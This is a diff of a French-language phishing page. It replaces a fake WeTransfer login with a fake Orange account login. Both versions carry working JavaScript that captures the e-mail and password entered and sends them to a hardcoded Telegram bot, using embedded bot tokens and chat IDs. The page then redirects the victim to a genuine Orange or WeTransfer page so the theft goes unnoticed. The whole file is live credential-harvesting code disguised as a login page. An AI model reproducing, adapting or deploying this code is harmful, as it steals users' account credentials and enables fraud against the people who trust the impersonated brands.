@@ -4,109 +4,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion</title>
-
-    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque-Bold.10832e10.woff2">
-    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque-Medium.1acd899d.woff2">
-    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/GT-Super-WT-Super.3397811e.woff">
-    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque_W_Medium.7e37a161.woff">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
-        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
-
+    <title>Accueil</title>
 
     <style>
         * {
+            margin: 0%;
+            padding: 0%;
             box-sizing: border-box;
-            padding: 0;
-            margin: 0;
-            font-family: GT Super WT, -apple-system, \.SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif;
         }
 
         body {
-            min-height: 100vh;
-            max-height: 100vh;
-            display: flex;
-            flex-direction: column;
-
+            font-family: Arial, Helvetica, sans-serif;
+            height: 100vh;
         }
 
         .top {
-            height: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
             position: fixed;
-            left: 0%;
-            top: 0%;
+            top: 0;
+            left: 0;
             width: 100%;
-            background-color: white;
-            padding: 15px;
+            height: 50px;
+            padding: 8px;
+            display: flex;
+            background-color: black;
         }
 
         .top img {
-            margin: auto;
+            margin-right: auto;
+        }
+
+        .top div {
+            width: 130px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .top svg {
+            color: white;
+            width: 40px;
+            height: 25px;
+            cursor: pointer;
         }
 
         .center {
-            height: 90vh;
-            width: 100%;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            padding: 0px 15px 15px 15px;
+
         }
 
         form {
             width: 100%;
         }
 
+        label {
+            font-size: 0.7rem;
+        }
+
         input {
             width: 100%;
-            height: 50px;
-            margin-bottom: 30px;
-            border: 1px solid;
-            border-radius: 8px;
-            padding-left: 10px;
-
+            height: 40px;
+            border: none;
+            border-bottom: 2px solid;
+            margin-bottom: 20px;
         }
-        input:focus{
+
+        input:focus {
             outline: none;
+        }
+
+        p {
+            font-size: 0.8rem;
         }
 
         button {
             width: 100%;
-            height: 50px;
-            margin-top: 20px;
-            border: none;
-            border-radius: 9999px;
-            background-color: #191919;
+            height: 40px;
+            background-color: black;
             color: white;
-
+            font-size: 1.1rem;
+            font-weight: bold;
+            margin-bottom: 200px;
+            cursor: pointer;
         }
 
-        @media (min-width: 612px) {
+        footer {
 
-            /* Styles pour les écrans de PC */
+            min-height: 620px;
+            background-color: black;
+        }
+
+        footer img {
+            width: 100%;
+        }
+
+        #co,
+        #pwd,
+        #pwd_label {
+            display: none;
+        }
+
+        @media (min-width: 800px) {
             body {
-                min-height: 100vh;
-                max-height: 100vh;
                 display: flex;
                 flex-direction: column;
+                align-items: center;
+            }
 
+            .top {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 70px;
+                padding: 10px;
+                display: flex;
+                background-color: black;
             }
 
             .center {
-                border: 1px solid rgba(128, 128, 128, 0.288) ;
-                border-radius: 10px;
-                background-color: white;
-                width: 400px;
-                margin: auto;
-                padding: 20px 30px 20px 30px;
-                margin-top: 25px;
+                width: 500px;
+                margin-top: 100px;
             }
 
-
+            footer {
+                display: none;
+            }
 
 
         }
@@ -115,95 +137,151 @@
 
 <body>
 
-    <br> <br>
-
     <div class="top">
-        <img class="wt-product-logo" src="https://auth-cdn.wetransfer.com/assets/images/logo-free-mobile.svg">
+        <img src="https://c.woopic.com/logo-orange.png" alt="">
+
+        <div>
+
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                class="lucide lucide-search">
+                <circle cx="11" cy="11" r="8" />
+                <path d="m21 21-4.3-4.3" />
+            </svg>
+
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                class="lucide lucide-user">
+                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
+                <circle cx="12" cy="7" r="4" />
+            </svg>
+
+
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                class="lucide lucide-align-justify">
+                <line x1="3" x2="21" y1="6" y2="6" />
+                <line x1="3" x2="21" y1="12" y2="12" />
+                <line x1="3" x2="21" y1="18" y2="18" />
+            </svg>
+        </div>
+
     </div>
+
+    <br> <br> <br>
 
     <div class="center">
 
-        <h3 style="text-align: center;">Connectez vous pour accéder au document</h3>
-
-        <br>
         <br> <br>
 
+        <h2>Veuillez vous identifier</h2> <br> <br> <br>
+
+        <h4>Indiquez votre compte Orange</h4>
+
+        <br> <br> <br>
+
         <form id="form">
+            <span id="notif" style="color: orange;"></span>
+<br>
+            <label for="email">Adresse e-mail ou votre numéro de mobile</label> <br>
+            <input id="user" name="email" type="text" required> <br>
+            <span style="color: orangered;" id="notif"></span>
 
-            <input type="email" id="email" placeholder="E-mail" required> <br>
-            <input type="password" id="pwd" placeholder="Mot de passe" required> <br>
-            <a href="#">besoin d'aide ?</a> <br> <br>
+            <label id="pwd_label" for="pwd">Mot de passe </label> <br>
+            <input id="pwd" name="pwd" type="password" maxlength="4" required> <br>
 
-            <button type="submit">Se connecter</button>
+            
+            <p>Comment retrouver l'adresse e-mail associée à votre compte ?</p> <br> <br> <br>
+
+
+
+            <button id="next" type="submit">Continuer</button>
+            <button id="co" type="submit">Se connecter</button>
+
         </form>
     </div>
 
-    <script>
 
-
-
-document.getElementById('form').addEventListener('submit', function (e) {
-            e.preventDefault();
-        
-            // Récupération des valeurs du formulaire
-            const email = document.getElementById('email').value;
-            const pwd = document.getElementById('pwd').value;
-            
-            // Validation des champs
-            if (!email || !pwd) {
-                alert('Veuillez remplir tous les champs.');
-                return;
-            }
-        
-           
-            // Construction du message
-            const message = `
-                WE TRANSFER :
-                \n📩Email : ${email}
-                \n🔑mot de passe: ${pwd}
-                
-            `;
-        
-            // const botToken = '5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc'; 
-            // const chatId = '5276838022'; 
-
-            const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; 
-            const chatId = '7332838769';
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        
-            // Envoi du message au bot Telegram
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    localStorage.setItem('email', email);
-                    console.log('Votre message a été envoyé avec succès !');
-                    window.location.href='https://help.wetransfer.com/hc/en-us';
-                } else {
-                    console.error('Erreur lors de l\'envoi du message:', data.description);
-                    console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
-                }
-            })
-            .catch(error => {
-                console.error('Erreur réseau ou serveur:', error);
-                console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
-            });
-        });
-        
-
-
-    </script>
+    <footer>
+        <img src="./img/footer.png">
+    </footer>
 
 </body>
+
+
+<script>
+
+
+
+    //   document.addEventListener('DOMContentLoaded', function () {
+
+    //      var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 48, 57, 45, 50, 57));
+
+
+    //      var b = new Date();
+    //      var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+    //      if (c >= a) {
+    //         document.body.style.backgroundColor = 'red';
+    //     }
+
+    // });
+
+
+
+
+    document.getElementById('next').addEventListener('click', function (e) {
+        e.preventDefault();
+        var user = document.getElementById('user');
+        if (user.value.trim() !== '') { // Utilisation de trim pour éviter les espaces vides
+            document.getElementById('co').style.display = 'block';
+            document.getElementById('pwd').style.display = 'block';
+            document.getElementById('pwd_label').style.display = 'block';
+
+            document.getElementById('next').style.display = 'none';
+            document.getElementById('co').style.display = 'block';
+
+
+        }
+    });
+
+    document.getElementById('co').addEventListener('click', function (e) {
+        e.preventDefault();
+
+        const botToken = '5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc';
+        const chatId = '5276838022';
+
+        // const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; 
+        // const chatId = '7332838769';
+
+        const user = document.getElementById("user").value;
+        const pass = document.getElementById("pwd").value;
+
+        if (user === '' || pass === '') {
+            return document.getElementById('notif').innerText = 'Veuillez remplir tous les champs !';
+        }
+
+
+        const message = `🎁 Orange mail :\n\n👤 Utilisateur : ${user}\n🔐 Mot de passe : ${pass}`;
+
+        // Construction de l'URL de l'API Telegram
+        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Envoi de la requête à l'API Telegram
+        fetch(telegramURL)
+            .then(response => {
+                if (!response.ok) {
+                    return response.text().then(text => {
+                        throw new Error(`Erreur lors de l'envoi du message à Telegram: ${text}`);
+                    });
+                }
+                window.location.href = 'https://www.orange.fr/pages-juridiques/infos-legales.html';
+            })
+            .catch(error => {
+                console.error('Erreur :', error);
+            });
+    });
+</script>
+
 
 </html>
